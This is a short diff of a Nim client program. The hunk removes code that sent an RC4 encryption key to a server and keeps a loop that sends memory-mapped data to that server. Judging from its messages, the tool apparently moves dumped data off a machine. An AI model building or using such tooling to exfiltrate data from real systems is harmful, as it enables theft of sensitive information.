@@ -289,13 +289,6 @@ when isMainModule:
             echo "\n[-] Could Not Connect to Server!\n[!] Quitting..."
             quit(1)
     
-        echo "\n[!] Sending Encryption Key to Server..."
-        if not socket.trySend(rc4KeyStr):
-            echo "[-] Could Not Send Encryption Key to Server!"
-
-        ##if not socket.trySend($size):
-        ##    echo "[-] Could Not Send Size to Expect to Server!"
-    
         echo "\n[!] Sending Data to Server..."
         var bytesSent: int = 0
         while dataPointer <= (mappedData + size):
